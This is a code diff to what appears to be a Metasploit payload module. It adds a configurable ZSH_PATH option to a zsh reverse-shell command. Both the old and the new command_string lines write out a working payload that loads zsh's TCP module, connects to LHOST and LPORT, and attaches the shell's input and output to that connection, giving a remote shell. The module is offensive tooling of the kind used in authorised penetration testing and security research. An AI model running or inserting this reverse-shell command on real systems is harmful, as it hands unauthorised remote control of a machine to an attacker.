@@ -32,6 +32,9 @@ module MetasploitModule
       'RequiredCmd' => 'zsh',
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
+    register_options([
+      OptString.new('ZSH_PATH', [true ,'The path to ZSH', 'zsh'])
+    ])
   end
 
   def generate
@@ -39,6 +42,6 @@ module MetasploitModule
   end
 
   def command_string
-    "zsh -c 'zmodload zsh/net/tcp && ztcp #{datastore['LHOST']} #{datastore['LPORT']} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+    "#{datastore['ZSH_PATH']} -c 'zmodload zsh/net/tcp && ztcp #{datastore['LHOST']} #{datastore['LPORT']} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
   end
 end
